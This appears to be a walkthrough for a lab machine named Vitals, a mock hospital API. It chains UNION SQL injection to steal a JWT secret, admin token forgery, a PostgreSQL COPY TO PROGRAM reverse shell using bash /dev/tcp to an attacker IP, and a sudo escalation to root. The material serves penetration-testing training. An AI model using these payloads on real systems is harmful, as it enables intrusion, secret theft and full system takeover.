# Vitals — Walkthrough

## Machine Summary
**Name:** Vitals  
**OS:** Ubuntu 22.04  
**Difficulty:** Intermediate  
**Vector 1:** SQL Injection (CVE-2025-1094 inspired — unsafe string interpolation in PostgreSQL query)  
**Vector 2:** Privilege Escalation via misconfigured sudoers (postgres → root)

---

## Lessons
- API enumeration via Swagger/OpenAPI documentation
- JWT token analysis and forgery
- SQL injection via UNION-based data extraction
- Abusing PostgreSQL COPY TO PROGRAM for OS command execution
- Privilege escalation via misconfigured passwordless sudo

---

## Step 1 — Enumeration

Begin with a port scan:

```
nmap -sV -sC -p- --min-rate 5000 <target-ip>
```

Results show two open ports:
- **22/tcp** — OpenSSH
- **8080/tcp** — HTTP (Flask/Werkzeug)

Navigate to `http://<target-ip>:8080/api/docs` to find a Swagger UI exposing the full API surface:

- `POST /api/auth/guest`
- `GET /api/patients/search`
- `GET /api/vitals/{patient_id}`
- `POST /api/admin/query`

---

## Step 2 — Guest Authentication

The Swagger docs reveal a guest authentication endpoint requiring no credentials:

```
curl -s -X POST http://<target-ip>:8080/api/auth/guest
```

Response:
```json
{
  "token": "eyJ0eXAiOiJKV1Qi...",
  "role": "guest",
  "expires_in": 86400
}
```

Save this token for subsequent requests.

---

## Step 3 — Vitals Endpoint and device_token

Query the vitals endpoint for patient 1:

```
curl -s http://<target-ip>:8080/api/vitals/1 \
  -H "Authorization: Bearer <guest_token>"
```

Response includes a `device_token` field — a base64 encoded string. Decoding it reveals it is a JSON object containing device metadata. This confirms the API returns backend data directly and is worth probing further.

---

## Step 4 — SQL Injection via Patient Search

The `/api/patients/search?name=` endpoint is vulnerable to SQL injection via unsafe string interpolation. Test with a basic payload:

```
curl -s "http://<target-ip>:8080/api/patients/search?name=%27%20OR%20%271%27%3D%271" \
  -H "Authorization: Bearer <guest_token>"
```

All four patients are returned, confirming SQL injection. 

Sending non-ASCII or malformed input produces a revealing error:

```json
{
  "error": "Database error",
  "detail": "invalid byte sequence for encoding UTF8: 0x00",
  "hint": "Patient name fields expect UTF-8 encoded input"
}
```

This error message is consistent with PostgreSQL's internal encoding handling and points toward deeper database interaction.

Use a UNION-based payload to extract data from other tables:

```
curl -s "http://<target-ip>:8080/api/patients/search" \
  --get \
  --data-urlencode "name=' UNION SELECT 1,key,value,description FROM system_config--" \
  -H "Authorization: Bearer <guest_token>"
```

The response includes all rows from the `system_config` table. Among them:

```json
{
  "name": "jwt_master_secret",
  "ward": "Sup3rS3cr3tH0sp1talK3y!2024",
  "condition": "Master key for JWT signing — do not expose"
}
```

---

## Step 5 — JWT Forgery

With the master secret extracted, forge an admin JWT:

```python
import jwt, datetime

secret = 'Sup3rS3cr3tH0sp1talK3y!2024'
token = jwt.encode(
    {
        "role": "admin",
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    },
    secret,
    algorithm="HS256"
)
print(token)
```

---

## Step 6 — Remote Code Execution via COPY TO PROGRAM

The `/api/admin/query` endpoint accepts raw SQL with the admin token. PostgreSQL's `COPY TO PROGRAM` executes OS commands as the database service user.

Set up a netcat listener on your attacking machine:

```
nc -lvnp 4444
```

Send the reverse shell payload:

```python
import requests, jwt, datetime

secret = 'Sup3rS3cr3tH0sp1talK3y!2024'
admin_token = jwt.encode(
    {"role": "admin", "iat": datetime.datetime.utcnow(),
     "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)},
    secret, algorithm="HS256"
)

payload = {
    "query": "COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\"'"
}

r = requests.post(
    "http://<target-ip>:8080/api/admin/query",
    json=payload,
    headers={"Authorization": f"Bearer {admin_token}"}
)
print(r.json())
```

A shell is received as the `postgres` user.

---

## Step 7 — Privilege Escalation to Root

From the postgres shell, enumerate the database for additional information:

```
psql -U postgres -d vitals_db -c "SELECT * FROM system_notes;"
```

Output:
```
1 | Backup archiving enabled for compliance. See postgresql.conf         | dbadmin | 2024-11-03
2 | postgres account has temporary sudo access — not yet revoked         | dbadmin | 2024-11-03
3 | TODO: restrict guest JWT access to read-only endpoints before audit  | dbadmin | 2025-01-14
```

Note 2 confirms the postgres account has sudo access. Verify:

```
sudo -l
```

Output confirms `(ALL) NOPASSWD: ALL`. Escalate:

```
sudo su
```

A root shell is obtained.

---

## Step 8 — Flags

```
cat /home/nurse/local.txt
cat /root/proof.txt
```
